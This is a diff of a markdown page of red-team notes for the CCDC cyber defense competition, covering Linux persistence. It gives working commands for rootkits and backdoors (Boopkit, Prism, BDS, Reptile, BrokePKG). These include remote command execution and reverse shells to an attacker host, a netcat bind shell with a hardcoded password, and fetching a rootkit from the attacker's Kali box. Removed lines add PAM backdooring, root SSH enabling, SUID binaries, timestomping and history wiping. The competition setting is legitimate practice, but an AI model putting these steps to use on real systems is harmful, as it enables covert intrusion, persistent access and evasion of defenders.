@@ -77,31 +77,15 @@ pagetitle: Red Teaming for CCDC
     - Then update GP with `gpupdate /force`
 
 **Linux:**
+- [PANIX](https://github.com/Aegrah/PANIX)
+  - One-stop shop for lots of persistence methods, this thing is a great reference
 - Todo:
-  - Create a big zipped folder containing all necessary files (attacker and client)
-    - This will be our kali-setup zip to download
-  - Write a persistence script that does the following
-    - Gets all relevant files from kali
-    - Backdoors PAM (adds the master password and logs new passwords)
-    - Permits root login: `sed -i '/PermitRootLogin/c\PermitRootLogin yes' /etc/ssh/sshd_config `
-    - Adds a Prism/boopkit service
-      - Hidden files lends itself EXTREMELY well to services
-        - However, once running, we can see it with `systemctl | grep "reptile"` so might need to set the overall prefix to something like "cpu"
-        - May also need to hide the prism/boopkit PID
-      - boopkit is better, but only works on 5.x+
-    - Add suid `ip`, `chroot`, and `ssh-keygen` (move `ssh-keygen` to `/usr/lib/openssh/`)
-      - `chmod u+s $(which env) $(which ip) $(which chroot)`
-    - Runs prism (on startup)
-    - Hides all of the above with a rootkit (and changing dates with something like `touch -d "May 26 2020" {file}`)
-      - This will likely require an internet connection or for our Kali to be able to provide necessary packages
-      - If kernel 4 or below, use reptile:
-        - `wget {kali_IP}:{port}/reptile.tar.gz && tar -xvf reptile.tar.gz && cd Reptile-master`
-        - `apt install gcc make build-essential linux-headers-$(uname -r)`
-        - Default options seem good, so `sed -i 's/reptile/redteam/g' config/defconfig && make defconfig && make && make install`
-      - If kernel 5 or above, use BDS
-        - Will need `sysctl kernel.ftrace_enabled=1` and also check if `make` and `gcc` exist
-    - Clear history: ` history -c && rm -f $HISTFILE` 
-      - Having space is important, seems to prevent logging even on newer kernels
+  - Touch up script
+    - Clean up boopkit
+      - `/root/.boopkit/` and install dir `/boopkit/`
+    - Make sure all dates are changed as necessary
+    - Fix script not self-deleting
+  - Test on arch? Def test on centos/fedora
 - [Boopkit](https://github.com/krisnova/boopkit)
   - Sneaky amazing backdoor that functions via back checksum TCP packets
   - `wget https://github.com/kris-nova/boopkit/archive/refs/tags/v1.4.1.tar.gz`
@@ -110,12 +94,17 @@ pagetitle: Red Teaming for CCDC
     - We need to find a way to get the default network interface
   - Then, after making on Kali, can run `boopkit-boop -rhost {target} -rport 3535 -c '{command}' -lhost {kali_IP} -lport {kali_port}`
   - Listens on TCP 3545 
+- [Prism](https://github.com/andreafabrizi/prism)
+  - `gcc -DDETACH -DNORENAME -Wall -s -o prism prism.c` or if that fails just download and run `prism`
+  - Then run `sudo python2 sendPacket.py {target_IP} {password} {attacker_IP} {attacker_port}`
 - [BDS](https://github.com/bluedragonsecurity/bds_lkm_ftrace)
   - Good compatibility, works on 6.x tested
     - Let's check out the non-ftrace one and userland one?
     - We need to slightly modify to allow hiding arbitrary ports/sockets
     - Removed `rc.local` persistence - non-sneaky, and borks systems with checks for kernel tainting in startup
   - Supports hiding files, backdoors, privescs, and hiding network connections (though only its connection, but we can easily change that)
+    - Root with `kill 000`
+    - Open bind shell with `nc {target_IP} 1338` and then access with `nc {target_IP} 31337` with password `bluedragonsec`
   - Config
     - Can be specified in `kernelspace/includes/bds_vars.h`
 - [Reptile](https://web.archive.org/web/20250703011339/https://github.com/f0rb1dd3n/Reptile/archive/refs/heads/master.zip)
@@ -130,7 +119,8 @@ pagetitle: Red Teaming for CCDC
     - `make menuconfig`, `make`, and `make install`
   - Bugs:
     - Reptile will hide more stuff than necessary in affected directories
-    - Until we fix this, we can rename `/reptile` to `/reptiled`
+      - Until we fix this, we can rename `/reptile` to `/reptiled`
+    - Couldn't get kali-side build working, so we can use prism for the shell
   - Usage:
     - `/reptile/reptile_cmd {show/hide}` to show/hide all hidden files
     - `/reptile/reptile_cmd root` to get root
@@ -141,14 +131,15 @@ pagetitle: Red Teaming for CCDC
       - Works with both adding users to `/etc/passwd` and cron jobs
         - Actually, having some trouble getting it working with cron jobs
       - However, ssh seems resistant. Can't seem to permit root logins with a hidden line or add an hidden authorized keys file
-    - Couldn't get kali-side build working, so we can use prism for the shell
 - [Caraxes](https://github.com/ait-aecid/caraxes/)
   - Seems to be pretty good for 5.14-6.11, but a bit lacking on functionality
     - This one would make a nice starting place for building our own
   - Will need to uncomment the `hide_module()` function
   - Good for hiding files - we can set the word to hide in `rootkit.h`
-- [PANIX](https://github.com/Aegrah/PANIX)
-  - One-stop shop for lots of persistence methods, this thing is a great reference
+- [BrokePKG](https://github.com/R3tr074/brokepkg)
+  - Install dependencies with `./scripts/dependencies.sh`
+  - Config in `./include/config.h`
+  - Seems to work on 5.x and 6.x? Less functionality than BDS, but a good backup
 
 
 ## Domain Persistence
